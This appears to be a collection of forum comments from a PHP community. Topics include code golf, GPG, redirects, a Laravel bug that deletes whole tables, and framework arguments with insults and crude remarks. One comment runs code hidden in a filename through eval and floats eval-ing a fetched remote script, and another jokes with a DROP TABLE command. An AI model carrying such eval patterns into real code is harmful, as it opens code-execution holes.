Just thought of another way to solve this by questioning the rules of the competition itself: how are you actually counting the number of characters? If you're just looking inside the script file itself and counting those, then what if our script still ran and did checks itself, but we didn't have to put characters in the script that are counted? Someone else has pointed out the more obvious ones that involve reading a file or calling a service somewhere, but the problem with those is you're not really looping, so I'd say that violates the rules. If you changed that solution slightly to use `eval()` against a script you fetch elsewhere, that _might_ be acceptable. Another problem with those is that you're pulling an external resource, so you could say that it wasn't your script that ran fizzbuzz. You can actually do all of this in one short php script, by putting the logic into the filename itself. Here's my file: -rw-rw-r-- 1 jkoudys jkoudys 32 Oct 3 12:24 while($i++&lt;100)echo($i%3?'':'Fizz').($i%5?'':'Buzz')?:$i,"\n"; and its contents: &lt;?php eval(basename(__FILE__)); Where its length is 31 (25 if you don't count the opening `&lt;?php `). What I like about this solution is there's plenty of precedent for it. We use meaningful filenames all the time: much of the PSR is dedicated to autoloader naming conventions, and __FILE__ is frequently used in debug code. I still think my 'invent a new language' solution is the best one for this competition, but you did come here looking for a PHP script.
What do you mean with gnupg being too complex for this? I use gpg to do scripted actions from php and bash shell scripts frequently. It does require a bit of setup, but once done it's very easy to use and dupe the setup to other machines. Maybe if you can give me some info on what you're finding difficult I'd be willing to help you set it up. Once it's working it works well and I'm very happy with it.
How bad is this? 
&gt; Windows supports both / and \ as directory separators, and actually has for a long time. I am well aware of this, but when I execute a php command like: echo dirname(__FILE__); and the result comes back as: E:\phpsites\wwwtest Then drupal does some shit somewhere deep in bootstrap.inc like: include dirname(__FILE__)."/sites/default/settings.php"; it results in shit like: file not found (E:\phpsites\wwwtest/sites/default/settings.php) If there is a way to configure php so that all of its functions follow your "proper way to do it is to always use Unix-style paths, with /" I'm all ears. edit - I have mostly tweaked some settings so that Drupal works fine 99% of the time, I still occasionally see this type of crap though and I am half tempted to use php's autoprepend to rewrite some of the php functions that return windows style directory separators so that they return unix style ones.
I'm able to use https://github.com/jasonhinkle/php-gpg to encrypt data, but I cannot get gnupg to decrypt it. For the life of me I also cannot get gnupg to decrypt anything by supplying the passphrase in a file or stdin.
Save your sanity: Don't read the comments.
Looks like a decent library. Is there any reason the methods are not static? Seems like an unneeded extra line of code to create an object instance that you will only use once anyways.
But they opened it up to community requests before being finalized.
I prefer to let my web server handle this. That way you get the correct IP address in your access logs in addition to your PHP application. For nginx I use: http://nginx.org/en/docs/http/ngx_http_realip_module.html
missing `;` $basicurl = 'ABC://'**;** and $finalurl needs to be defined before you concat on line 8
&gt;and $finalurl needs to be defined before you concat on line 8 What should I define it as or how should I define it? I've tried just doing $finalurl by itself and $finalurl = '' right before line 8 but those don't work.
 $finalurl='';
We could add a static method call for sure. I prefer not to make it static since it's easier for dependency injecting (think unit testing, using DI layers, etc). The idea is that you can initialize your one object instance at runtime once and use that instance everywhere through your DI.
It's definitely useful to solve the problem at the web server level as well, but there's no reason you can't use both. For example, using this class means you don't have to change your code if you turn CloudFlare on and off on a regular basis or if you deploy to a web server you don't have the ability to map the real IP to another header.
Sublime Text. I think Notepad++ does too, though I haven't used it for a long while.
I will give this a try this weekend and get back to you. Once I encrypt something with it I should be able to use some of my existing scripts to decrypt since you say the decrypt doesn't have to be in php. That will work in nice with your cron job.
Or initialize it many times with different configuration and pass them around individually. Just say no to static. I've yet to encounter a situation where it was truly advantageous to use static methods. Once in a while I'm guilty of using one as a pseudo factory but that's because I'm lazy and hate myself.
 $query = $_SERVER['QUERY_STRING']; $baseURL = 'http://google.com?foo=bar'; $separator = (parse_url($baseURL, PHP_URL_QUERY) == NULL) ? '?' : '&amp;'; $baseURL .= $separator . $query; header('Location: ' . $baseURL); This works fine.
try this, then check your error log to check the value of $finalurl $query = $_SERVER['QUERY_STRING']; $basicurl = 'ABC://'; $separator = (parse_url($url, PHP_URL_QUERY) == NULL) ? '?' : '&amp;'; $finalurl = $separator . $query; error_log("finalurl: ".$finalurl); header('Location: '.$finalurl); Make sure you are not outputting anything before you use header();
Cool, thanks man! BTW both servers are running RHEL 6 and PHP 5.3.3
I would suggest you to use a linter or an IDE that can analyze your code. Obligatory http://phptherightway.com (+ error_reporting)
To say "they opened it up" implies that it had been previously closed, when it was not. The entire discussion process was open to anyone who wished to participate (although the voting was for voting members only). Full disclosure, realizing I failed to mention this earlier: I was the coordinator/shepherd/steward/whatever behind PSR-1 and PSR-2. Take that for what you will.
Indeed. I can't believe this trivial patch waited so, so long to get merged while people with commit access kept adding much less important stuff over the months.
(/me nods) I don't recall that, but it was a couple years ago, so my memory may be faulty. Can you point to links where the group "requested feedback" (in whatever capacity) before the vote?
/r/PHP is not a support subreddit. Please visit /r/phphelp for help, or connect to ##php on Freenode IRC
I never said anything about autoformatting all code, I specifically said indentation. Not really sure what your point is to be honest, you don't copy-paste chunks of code all that often.
The formatting makes it pretty hard to read. Also, you should give more information about what the code does, what your trying to achieve, logs and errors, etc.
Why should I put forth the effort to help you when you can't put forth the effort to format your code or even describe the issue you're experiencing?
Per the PSR-2 survey, nobody "chose" it. Spaces were by far (two to one) the common indent style of the surveyed projects. That's all.
How does this compare to [Omnipay](https://github.com/thephpleague/omnipay)?
Wah? Why not?
Yeah I get into that race at well at times :)
It is not always redundant if the programmer somehow changes the array size inside the loop, because crappy code/hacks/a quick patch/who knows.
&gt; Why is it necessary to install an extension to use Memcache? Why is this not needed for someting like PDO? PDO **is** an extension, just as the "memcache" (or "memcahed") is an extension, PDO just happens to be a **default** extension.
Is programmatic routing really such a stupid thing?
To reproduce: $u = ModelWithNoSoftDelete::find(1); $u-&gt;forceDelete(); Well, I've just had the shittiest of all morning :) Thank god for MySQL Binary Logs. 
Could make a static factory method, that could chain the call? 
Here's the answer: http://www.reddit.com/r/PHP/comments/22ih6r/working_on_php_ecommerce_need_rich_payments/cgnbimw 
Ouch. Yay for disaster recovery procedures.
If you just meant indentation then this whole discussion is useless, because indentation is just 5% of coding style. The IDE is not a solution here. So my point is: having contributors follow the custom code style of your project is hard. Before PSR-2, less contributions, worse contributions. Now it's cool.
Whoops! 
There is no SQL query here. The code your posting is removing the last character from the query string (whatever that query string is). PS: There also seems to be a syntax error in that you have "$substr" where it should be "substr" unless you're doing some weird function aliasing stuff. 
There it is
Man that sucks. Makes me want to triple check all of my nightly backup stuff. If that happened to me I'd have some very pissed off people. 
Fair enough - the remi repos are pretty frequently released. Yeah I'm more about compiling out things I don't use from the default and doing just PHP-FPM and CLI...
WHO THE FUCK SAID THAT 
Basically it loops through every country and creates an option tag. Definitely check out sprintf() usage. It's handy for writing clear HTML tags. Of course, it's only clear if you understand the sprintf tag... Bascailly each %s in the tag is referencing the 2nd, 3rd and 4th parameters of sprintf. Hope you can make sense of it. Good luck. Also, consider posting future support requests in /r/phphelp, as requested in the sidebar. :)
Thank you so much! I will use the proper sub in the future. :) I'll delete the post here.
This must be one of the stupidest names, that anyone can give to a framework. Unsurprisingly, it also seems to have nothing in common with MVC architectural pattern.
`mb_internal_encoding` effects the `mb_*` functions. utf8 can use characters that are longer than one byte. In that case, the normal string functions like strlen(), or `mb_*` functions with incorrect encoding will return incorrect values: echo strlen('aäaä'); // 6 echo mb_strlen('aäaä'); // 6 mb_internal_encoding('utf-8'); echo mb_strlen('aäaä'); // 4 Edit: also FYI, your database and input don't need to be the same, you just need to tell the database what encoding your input is, e.g. "SET NAMES UTF8"
The question doesn't make that much sense as it stands, it's not really PHP files that you need to keep protected but configuration. At any rate: * yes, the web root should only handle things like css, js, images etc (and of course the entry point) * it doesn't matter for performance * you should look at auto loading over paths in php.ini, it keeps code self contained * accessibility ??
Yes, the situation with PR merges currently isn't good. As there's nobody who's actually responsible for getting PRs triaged and merged, you have to wait until someone with both the motivation to do the merge and the expertise to review the patch comes around on their own :/
I don't follow the way people are discussing this issue, it's obviously a (major) bug why are they discussing it at all?
To mount a plaintext recovery attack against RC4, presumably one needs to collect millions of RC4 encrypted ciphertexts where identical plaintext message is encrypted under different keys. This doesn't sound quite practical at first, but may be exploited, if your system allows such conditions (and the attacker can collect those ciphertexts). Anyway, it is presumably not one of those "easy to mount attacks" in general.
This system will be different messages encrypted with the same 2048 bit public key. There will be less than three a day on average.
So, an explanation of this bug from someone who doesn't know Laravel but just spent 10 minutes looking into this - tell me if I got it wrong. When you call a method on a model instance, and that method isn't implemented on that model instance, it creates a new query and calls it, *exactly the same* as if you did `Model::func(...)`. This query isn't limited to just the one model instance (row). So if you call `Model::forceDelete()` on it, and forceDelete isn't implemented on that model, it'll delete the entire table. Now, due to a wonderful stroke of planning, there's a trait which implements forceDelete on a model instance to only delete that one instance (row). So if you forget to implement that trait, or accidentally call forceDelete when you meant to just call delete, your code doesn't crash, it just deletes the entire table.
Same with dotdeb for us Debian/Ubuntu users :)
I tried out the php script and I cannot decrypt anything it encrypts either. I get the error: &gt; gpg: public key decryption failed: wrong secret key used I generated an RSA key pair on a user with no keys, so they are the only ones present. Used that public key to encrypt and when I try to decrypt with the matching private key I get that error. I don't think that php script works well, it's seems quite buggy if I can be sure there's no confusion in keys and can't decrypt it's output. I can manually encrypt and decrypt with the key pair successfully with gpg directly so I'm sure they work. But gpg won't decrypt the output from that php script. I think you might be better off with another script or even just calling gpg from a php exec command.
Lol, this is awesome. Guess you guys should have picked a framework that is actually tested. With all the "Laravel side stuff" coming out like Laravel Forge, it seems that Taylor spends more time marketing, popularizing and [turning it into a business](https://twitter.com/taylorotwell/status/518081661238378497) than actually making it better.
&gt; Guess you guys should have picked a framework that is actually tested Well, my other choice was Symfony, but then I would have sacrificed fast development speed. Even with what happened - it doesn't really make me doubt the framework. Laravel has been nothing but good stuff. The rest of your comment is just slander and not really relevant to the discussion, but hmm, I'm glad that Taylor found a way to monetize his work. I'm sure you'd love that, right, Mr. PHPPixie? 
&gt; So if you forget to implement that trait, or accidentally call forceDelete when you meant to just call delete, your code doesn't crash, it just deletes the entire table. Eh, yep. The complete history is that softDeleteTrait didn't exist in 4.1; soft-deleting was part of the eloquent model. In 4.2, it got separated into a Trait, but the `-&gt;forceDelete()` method is still there... and for some reason, ignores the current entity and just do it on the whole table. The last part is the `wtf`. 
There it went.
You have an obvious bias given your sexist framework. Maybe you should cool your roll a little or go hang out with Brandon in the grumpy booth?
I've been wanting to go to PHP UK for a while now, but I've always wondered if there is an age limit? I'm 17 and I turn 18 after the conference next year, so if there is an age limit that would really blow.
Why are you force deleting? What's wrong with $model-&gt;delete() Are you after $table-&gt;truncate(); To delete all the records in a table instead?
My framework is only sexist to people that have never seen boobs in their entire life. A normal person couldn't care less about a boobsy fairy on the logo. Do you also rage like that every time a game comes out that has female characters with titties?
Like I said in the issue, my users model were using softdelete in the early version. Specs changed, dropped the deleted_at column, set softDeletes to false, completely forgot to change `-&gt;forceDelete()` to `-&gt;delete()` when erasing users. Didn't really matter since it still worked fine. When I switched to 4.2, that bit that I forgot really bit in the ass :) 
Thanks for the reply. I was thinking that the website will ask the user to link the path to the folder (like when you upload a picture on imgur, to upload you have go through folders etc to get to the picture, it would work like that), then the program would chose the game log file and extract the information required. I took a ready over the game log files, there is not any personal information within these files, it is strictly logs for the game. Edit: Just found that within the log, the game logs the hardware that the user has. I don't think this is considered personal information?
This. The components individually are very well built and the framework really integrates them nicely. Try not to go too far too fast. Unfamiliar with composer? Have a look at that first. Build a small hello world app, then a blog, something that integrates a 3rd party library (twilio, dropbox, ...). I don't know where you live but most places have a php user group nearby, try having a look if you guys have one and go to a couple meeting explaining that you're looking at symfony but are having a bit of a hard time getting used to it. If you have an issue with your small project, take your laptop with you. I've helped a few people already like that, it really works.
Yes
The third comment made me laugh and feel bad at the same time. Hehe.
there are plenty of sites doing that (and much more) by using the API Riot provides. Take a look [here](https://developer.riotgames.com/). 
Many people would say Yes, it is a very bad idea to start a project with codeigniter today. While codeigniter is still actively developed it is considered a stagnant / dead project and should not really be used for anything new. Codeigniter was designed to work with PHP 5.2 and so does not follow any of the modern features put in 5.3 and up. It really doesn't matter too much what framework you use though, as long as it is following modern standards (composer, auto loading, namespaces etc)
Dag bro. You sound bitter.
The move to using a trait is what is keeping me from moving to 4.2. I’ve got over 600 tables and just don’t have time to go through all my models to see which ones I specified as soft delete in the migration scripts. I suppose I’ll have to write a tool at some point...
Sure, take the submission to the server, add to your DB then use your mailing list providers API to subscribe them. You'd do this rather than just sticking their supplied code on your page.
Sure you can get some assistance, why don't you try posting in a support forum
Maybe try this in a .htaccess file at the same directory level as index.html ? RewriteEngine On RewriteRule ^portfolio /index.html [L]
I did it with regex. The code conversion was okay, but I didn't have 600 tables though. 
My opinion: Symfony is excellent but has a slightly bigger learning curve, and the stuff it includes is very good for enterprise applications. But... I find that I develop slower with it. Symfony really encourages bundling and better code in general, which is good, but sometimes you just wanna hack some shit up and see how people react to it. Every time I do that in Symfony, I feel like a kitten died somewhere. Again, just my personal opinions :)
&gt; Sorry for bad writing, posting this really quick. If you can't be bothered to put effort into writing it, why do you expect us to put effort into helping you?
I would be like: fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck fuck. FUCK.
no Liferaft™ to prove that it's a bug
 #phpgate
[Pretty accurate](http://imgur.com/zpmt3lF) 
Damn, that's almost a fresh Drupal install.
force deleting is for models that have soft deleting. It basically skips the soft deleting mechanic and deletes the model. (In some instances you want to soft delete, others you don't) The problem is that if you force delete on a model that doesn't have soft delete, the query is targeting the table instead of a row on the table so it deletes the whole table instead of just deleting the row. (At least that is what I got from all of the discussion).
cron
You forgot to put $Row in front of ['Time'] and ['Count']. What you did was just create an array containing the value 'Time' and another containing 'Count'. edit: Next, look into "prepared statements" and try to change your insert to use them.
I guess the first question is, what sort of data are you actually scraping? Are you scraping HTML structured data or something else? Are you scraping JSON based data structures? A little bit more information is required. Probably the next question is going to be how responsive does this need to be? If you can get way with a single threaded instance then cron is probably going to be the easiest. If you need something a bit more complex then you might want to look at doing something with Gearman or the like creating job queues and having workers sit and monitor the queues waiting for new work.
Laravel isn't "cool", because PHP isn't cool. But Laravel is good, so it doesn't need to be cool.
Sorry about this. Definitely unexpected and unintuitive behavior here when you forget the trait. I've released Laravel 4.2.11 that makes this more like the regular "delete" method. If you call it on a non-existent model instance nothing will happen. My sincere apologies on the issue and headache.
Thanks I knew it would be somthing stupid 
I was writing this quickly as I was hoping for a reply ASAP. If you're going to be cocky you can fuck off lad
Thanks but is their anyway it would be able to go to that part of the website?
Haha, no worries Taylor! Thx for your good work. 
I'm not sure where you're getting tripped up at, but yeah. Maybe you could provide some code snippets of what you currently have and it may clarify things for everyone.
Has anyone really been far even as decided to use even go want to do look more like?
Always go with the right tool for the job. Every project is different. If your goal is to educate then go with what your comfortable with. Everyone starts somewhere and learning MVC pattern for the first time, CI is easy to learn.
If that rewrite rule does what you want.. shows your site when going to /portfolio.. and it still does not display the portfolio section, then you need JavaScript help. I'd just contact the person who made did this. It's basically all one page of html. The URLs are faked with javascript.
I would avoid CodeIgniter if your goal is to teach PHP the right way. CI was created before namespaces, and before many of today's best practices came into play, like service containers, standard autoloading, and real package management.
Ah yes, refute my points about the inappropriate sexualized content of your documentation by using a vulgar term to describe a woman's anatomy. We've had this discussion before and you've obviously decided not to change the documentation, so I see no point in rehashing. I will, however, continue to call a spade a spade.
Are you sure its not `AND lang = '".$lang."'"; ` instead of `AND lang = '".$lang."''; ` ? If this is indeed the very end of a SQL statement, that last `'` must be a `"` to work. Like others have said, most likely the reason this isn't secure is because $lang isn't being sanitized (it could be above though, we don't know with the very last bit of a single statement). If the code does indeed have it as you posted it (`'` instead of `"`), please post the whole code as everyone here (including me) is reading this wrong.
 $Date = date("d-m-Y"); $Time = time(); $Count = $Count +1; $Insert = 'INSERT INTO TBL_Time (Date, Time, Count) VALUES ($Date, $Time, $Count)'; $PreQuery = $DB-&gt;prepare($Insert); $PreQuery-&gt;execute(); echo "Date: " . $Date . " | Time: " . $Time . " | Count: " . $Count; echo "&lt;BR&gt;"; got to this now what do I need to do?
Could someone describe what happens exactly? Why can I call forceDelete() when its not there, without getting a method not found error?
Because PHP provides a "magic method" called __call. If you try and call a method on an object, and that method doesn't exist, __call is called instead if that exists. In Laravel's case, they implement it to create a new query builder and call the method that you tried to call on the model, on that query builder.
Data comes from web app that's JS heavy, that's where casper.js comes into play, but the app itself has an "internal" API that's serving data in JSON format. So to answer your question, first I'm scraping HTML to get to the internal API, but data itself comes in JSON format. Although I'm working on bypassing the part where I'm scraping html. Regarding second question, scraping wouldn't be done more than once or twice per day, on no more than ten different (same rules apply) sources. 
&gt; Symfony really encourages bundling and better code in general, which is good, but sometimes you just wanna hack some shit up and see how people react to it You're comparing production code with prototype? There's absolutely nothing stopping you from hacking things up in Symfony. I feel like PHP finally caught up with a decent framework and the community snubs it for a dirty hack. 
Could try CakePHP as well. I haven't tried Laravel. I've only used Yii and Cake. Between the two CakePHP is probably the easiest for newcomers. On the otherhand, have you looked at [Meteor](https://www.meteor.com/)?
Is this Eloquent or built into Laravel?
It's a legit complaint. When considering a framework for use in a professional environment that logo is an immediate turn off. It exudes a lack of professional quality, cartoon tackiness and yes, objectification of women. Seriously, it's enough of a reason to not give your framework a second look. 
A lot of people call Laravel the cool kid but ultimately people are flocking to it because they can recognise a solid, modern framework when they see it. It takes the niceties of modern PHP with best practices of RoR and Django. 
You *want* validation. you *want* people to use your code (or at least look at it). If you *want* these things you *need* to be sensitive to your audience. Being quirky and whimsical has it's place. The name *itself* is so. You could completely have a "fun" logo without pandering to adolescent fantasies of a slutty buxom cartoon fairy. It's laudable that you put your code out there for people to look at, but dismissing people's legitimate concerns as 'flaming' or 'trolling' does not serve your goals in the least. Most people pick up frameworks for use in a professional environment - whether or not you personally are doing it for fun doesn't even begin to enter into equation when considering what to chose. You are excluding your work from consideration before it's even measured for it's technical merits. You've been called on this several times before. Perhaps maybe there is a reason for that? I don't know... 
Arent you guys testing your code? Seems like fairly obvious to catch if you arent just writing code and shipping it to production without running through the most basic tests.
I said good, not great. Table was probably on its last legs, anyway.
I think the community and ecosystem surrounding PHP is big enough to support multiple initiatives in the realm of standardization. I don't hold the fig as anything more than what it is, a suite of standards you can choose to adopt or ignore. While I do agree with your position on "radical change" in the broader sense, I'm just not sure what it is that you're after as it applies to PHP and the related community. In summary, I think the php-fig has done great work, am willing to get behind any new initiatives that align with my own ideals about things, but fail to understand what your goal is with this post exactly. So questions... - What is the goal of the community kernel you seem to be suggesting, what specific problems will it address? - Politics aside, what are your complaints with the net outcome of what the FIG has established in terms of suggested standards? - Does this group live in user land or are you talking about rebooting the culture of internals and related processes (politics)? 
You .. are missing the point. If I *already* have a job and I'm asked to look at the current framework offerings and make a recommendation to my boss about which technology we should adopt for a new project, I'm not going to recommend yours because I can't send my boss a link to your framework without being considered a joke. I'm telling you right now, I'd dismiss your work upon hitting the landing page. It loudly screams a lack of professional credibility. And you sit here and whine about how you "do work for the community" but "nobody even wants to look at your code", yet /u/utotwel works long hours on Laravel, which he provides for the benefit of the community - a major bug is detected and fixed in pretty short order, and your first response is to "lol", and then make some disparaging remarks implying it's not properly tested (because you've never overlooked something ever in your career right? you are just that good..), followed by some butthurt because the guy has monetised something which is only tangentially related to his actual framework... Just.. wow man.
(Disclosure: I'm one of the original FIG voting members.) &gt; the community and ecosystem surrounding PHP is big enough to support multiple initiatives in the realm of standardization I agree -- but we don't seem too many projects actually doing the work of collaboration.
My lol wasn't targeted at the creator. I was ridiculing the fanboyism that is so frequent around here, where people praise Laravel over everything else. I know that bugs happen everywhere, and it doesnt mean the projects is bad itself.
&gt; Votes would be given only to projects that have wide install base and popularity. Github stars aren't a good stand-alone metric for install base or popularity. Github is not the center of the FOSS universe. Some of us *snobs* prefer Mercurial and are over on Bitbucket instead. Composer installs might be another interesting metric, but it also wouldn't be suitable stand-alone.
Hangon, your claim that it somehow isn't properly tested is somehow the problem of the fanboys?
Then why there is only a handful of projects there? If things are so awesome and so much time has passed wouldn't you expect seeing a lot more participants? Does it mean that all PHP has to offer is 20 projects?
Well it doesn't have to be some single measure. Obviously if there is some proof of an extensive user base it would be as good. It doesn't have to be github.
This is patently false and I don't know why it's been boated so hard by le Redditors. All source code should be in unmapped paths, that is, unreachable from public URLs and that certainly includes your "index or launch file" - no exceptions.
My understanding is membership is granted based on merit. Existing members review prospective members and vote them in. This way, if someone has a small project but their point of view is deemed to be valuable to the discussion they can be included. I don't know why this is problematic? As for forcing the standards, it's been stated before by myself and others in the other thread you started that it isn't possible or practical to enforce standards. Often those who speak for the project don't have the complete say on the project (especially projects which have a democratic process themselves...). Sometimes it offers no tangible benefit to their project to go back and make these kinds of changes (invalidation of pull requests, etc etc). It really isn't as big a deal as you are making out though. Sure it'd be great if there was "one true standard" but to my knowledge no language has ever achieved this. Excluding very smart people from the conversation on the basis that they can't or won't adopt PSR-2 is... actually pretty dumb.
You seem to be very confused about the purpose of PHP-FIG.
The real question is "Why did 20 different projects led by very different personalities join in the first place?" I'm surprised that many wanted to collaborate. I find it somewhat encouraging.
You actually can have it both ways. They have it both ways right now. As far as I can tell it works fine and everyone with the exception of yourself is happy with it. If you want to make a change, get yourself joined up to the fig and propose a bylaw. What you are proposing, as best I can understand, offers no tangible benefit to the FIG or the PHP community at large. Unless your point is so ill-defined that I can't see it.
After over 2 years? I think in that time you could gather a small army. )
Well you have to agree that you should give power only to those who can handle it =)))
CodeIgniter wasn't designed, it was piss poor attempt by completely clueless developers... 
Yes
Hey he said he was sorry.
First, she kinda showed it to herself =) Also, my dick joke was obvious sarcasm, I am afraid to think what the response would be if I didn't put the "just kidding" in the same tweet, thats why I did
Now now. Try to be nice. This is the internet, not a frat hazing ritual.
So, what you're saying is OP should use Symfony instead.
If the goal is to teach students some usable skills, I think they'd be much better off learning something more modern since they'll also learn modern best practices. 
This might be a regional thing, or perhaps based on early popularity. Yii is not the most popular of frameworks. Nor the best designed, nor the most sane -- it has static methods *everywhere* and uses the ActiveRecord anti-pattern, for example. It's not as bad as CI or Cake, but it's still not on the short list of frameworks people should be considering. Yii became briefly popular in the brief dark age of PHP frameworks, after Cake became popular and then everyone realized how sucky it was, and after Zend Framework 1 came onto the market and everyone recoiled at how verbose it was. I don't know anyone using Yii for new projects. Actually, let me amend that: I don't even know anyone using Yii for *current* projects.
Yes.
You know what else deletes entire tables? DROP TABLE LARAVELHATE; Accountability should still be in programming, even when using an MVC.
what he is saying is ci is outdated
I would have never attracted devs to the question then. Average answer increases when there are many view..... ya know ;)
This is why I use Stored Procedures. Also, be accountable. This is a bug, but a bug that is caused by bad programming. 
I totally agree with you. I just had a look at its source of YII2 and MY GOD! all I see is overly nested arrays everywhere.
Do you test the ORM of what the output is going to be? And if you're talking about integration testing, my test would look like "Check if the user has been deleted" which would return true cause the whole table is gone. Who the hell thinks about "Check if the whole table is gone" in tests??
Interesting fact, the worlds largest eCommerce incubator Rocket Internet uses Yii in their standard stack which ships with most new startups they produce. I am not sure of the thinking on why they implemented it when they started out but it is fast and was probably the best tool for the job at the time. Take a look at http://www.quora.com/What-is-the-current-Rocket-Internet-technology-stack Anyhow, there are some pretty big eCommerce players globally now with Yii on the front end. So, Jabong and Fabfurnish are both Rocket funded companies which means they use the Rocket stack. Edit: typo
Never said you couldn't. I just said I develop slower with it. Look at routing. There's like 3 different ways to do it with Symfony (php, yaml, annotation). I prefer a central places for all routes. It's preferences. And yes, I know, I could do that with Symfony. I can do anything with Symfony, but I don't want to, cause I don't like it. I think it's important that you like your code to be productive, and everytime I do stuff in Symfony/Zend, I don't enjoy it. The team I'm working with are there not because they're my employees, but because they want to. Symfony has a higher barrier of entry. Laravel is easy to understand. Anyone can pick it up in a few days. Like I said, it's a very powerful framework, I know, I've used it. I just don't like it. Personal choices yo. 
The SQL would fail if you tried to do a select from a non existant table. And you also should check that it only deleted the user you wanted it to and not everyone else.
The table is still there, the content is gone. &gt; And you also should check that it only deleted the user you wanted it to and not everyone else. That's silly. How would you even test for this, from a unit-testing point of view, it's kinda impossible unless you setup a closed environment for testing that actually saves to the database and query to it. That would make a deploy take an hour, because if you test for this scenario, it also means you're testing for some other crazy scenarios. Testing is usually testing for known behaviours or exceptions. "You're supposed to have tests for this" is just an arrogant thing to say. Tell me that you have a code that checks if all items have been deleted everytime you call the word "delete". 
Not at all. I am constantly surround by people who claim to know what they are doing who really don't. That comes with I.T. I guess. If you want to call them out simple say "Accountability" and they scatter like cockroaches when the light is turned on.
&gt; Never said you couldn't. I just said I develop slower with it. Isn't this just because you don't know it so well? &gt;Look at routing. There's like 3 different ways to do it with Symfony (php, yaml, annotation). I prefer a central places for all routes. It's preferences. I hear ya about too many ways to do things, I wish the documentation would be more opinionated and just throw the alternatives in as an afterthought. You probably haven't used annotations much if you prefer routes in a central place, it is much, much better to have route info right where you're coding, and if you want to see them all just use router:debug in the console. &gt;but I don't want to, cause I don't like it Laravel has a slightly lower barrier to entry, but it is an objectively worse framework. Holy shit, it just deleted all of your data because it couldn't find a record!!! Is this the same for UPDATE? Have you checked? I guess this is what makes me sad: the PHP community prefers to do things wrong because it's easier.
Yawn, this gets so old.... Stating SPs are not portable is like saying you can't run PHP code in Python... duh. Program for what you're programming for. Not hard at all to automate test, unless you don't know what you're doing. Version control is simple as fuck. Again, unless you don't know what you're doing. An answer 6 years ago http://stackoverflow.com/questions/77172/stored-procedures-db-schema-in-source-control Long running scripts in SPs are avoided if the code is well written. I've never had an SP timeout. Again, know what you're doing. Run tests on the HTTP load and see which is faster. Almost every time it's going to be the SP. In fact, I would suggest the load time is always faster on the DB end in lieu of the in line code. Constants sharing - again bad programming. 
Not really, the people who are busy making money are using symfony or zf, the kids with lots of time are doing laravel tutorials and posting on reddit. The 'popularity' of laravel is largely due to the reddit community being the frame of reference for many.
Have you looked through the CI code? Beautifully written, easy to understand, well organized. Followed mvc perfectly with the standards around at that time. The docs? Best of any framework I've ever used. You're just plain wrong buddy. 
Regarding current projects using yii, "craft" is a newish cms built on it.
Let me just say that I'm in total support of best practises, I think Composer is awesome, I think Laravel is great, I think CodeIgniter is terrible. But I think this might actually be a decent fit for something like CI. The reason I say this is that they're students with no prior webdev knowledge. CodeIgniter is a very direct approach. You can understand it very simply - it has few abstractions. Correct abstractions are a good thing, they make better code, but they also can make things harder to follow and learn. With something like Laravel comes a wealth of base knowledge. You have to understand a bunch of design patterns like MVC, service providers, front controllers, etc. You have to understand composer. These things are great, and important, but they may actually make it hard to learn initially. If they have an interest in improving or learning, then by all means look at other, and better, technologies.
Apparently Larry Ullman is still using it https://twitter.com/LarryUllman/status/518465397235130368
Well, look man. I'm glad that you found a way to like SPs and use them efficiently everyday. I don't like splitting logic, and MySQL is not my only data store. I use the right DB for the right stuff. I've seen so many people store increments in MySQL with SPs.. I prefer to use Redis for that. I've also seen shitty long ass SPs to do search. I prefer to use Elasticsearch for that. MySQL is my dumb data store and I like it that way. Anything more complex than a SELECT with 2+ joins and I'm considering another option. I prefer to query it using the app. If one day the query becomes the bottleneck, maybe I'll consider moving it to a SPs, but I'm pretty sure that at point, an SP will not solve the problem. You talk about load time but we're in /r/PHP, the land of shit-slowness. If I wanted speed I'd choose another lang, wouldn't I? Clearly speed is not my concern. I value ease of code, ease of read and ease of picking up more than the couple of milliseconds that SPs provides, because, really, that's all I can see that it provides. So many people hate SPs after trying it. I've had a 3 projects so far where 100% of the logic was in SQL Server, and everytime it was shit. Probably the guy that implemented it sucked - but I really don't see any upside to risk it. 
FYI FIG stands for "Framework Interoperability Group".
&gt; the ActiveRecord anti-pattern I'm well-aware of the disadvantages of Active Record, but I think calling it an anti-pattern is a bit of a stretch.
Weird, I know many people who use Laravel and make great money. Shit my own company is about to move a 5 million dollar a year platform onto Laravel.
Cron jobs for sure. Web crons if i need to do so more than once every 15 minutes as that's the most often hostgator allows you to set crons. I use setcronjob.com for web crons, been very reliable for me.
Once you initialize $module with the array and values, you can't get the date functions back. Here's one way you could do it: $moduleDates = array( date("Y/m/d"), "Today is " . date("Y.m.d"), "Today is " . date("Y-m-d"), "Today is " . date("l"), ); $moduleString = array( 'date("Y/m/d")', '"Today is " . date("Y.m.d")', '"Today is " . date("Y-m-d")', '"Today is " . date("l")', );
The "lack", if you can call it that, of members in PHPFIG, isn't due to the membership requirements. It's because there arent many people asking to join. Those that do, and get turned down, arent the quality of people/projects that belong in the group.
&gt; *I don't even know anyone using Yii for current projects* I started a new project based on Yii 1 in the end of 2010. The project is still active and evolving. At the time, Yii looked better than the alternatives (exactly the stuff you mentioned - CodeIgniter, Cake, or homemade messes). Nowadays, I can name multiple downsides (ActiveRecord and arrays of arrays of arrays being at the top of the list) and I've patched the core to add various improvements... I would not use Yii for a new project today - that would be either Silex or Symfony.
What you should realize is that you measured a bunch of garbage websites.
"I asked the wrong question which would give me the wrong answer so that I get more answers."
He's been writing that damn book for what seems like two years now...
&gt;Bugs are bugs, mate I don't think so in this case. The logic that lets a method on a record operate on a table is rather strange, the basic CRUD operations shouldn't compile to anything that doesn't have a primary key. If you're trying to operate on lots of records then you should operate separately on lots of objects or use SQL. E: went looking for the fix commit, couldn't find it &gt;And I won't use Symfony neither for my next project, that's for sure. I'd love to understand why. To me it's a no brainer, it's a mature, stable platform with funding and a massive community behind it. It could be easier to learn if they were more opinionated, but that's just a sacrifice of flexibility.
Yes this would work. Now the question is why would op want to do this?! 
We use Yii at our company because at the time it was the most attractive of the options (aug 2012) but if we were to start now we would've never used it, or even PHP for that, but if we had to then probably Laravel. 
Here's the one I released that was based on a ex co-workers work from many years ago. https://github.com/ellisgl/GeekLab-XPDO
Couldn't you simply use &lt;code&gt; raw php &lt;/code&gt; outside of php tags to show the raw php code? 
It's trivial to write a fizzlang interpreter in any language. In fact, you did it for the competition already. 
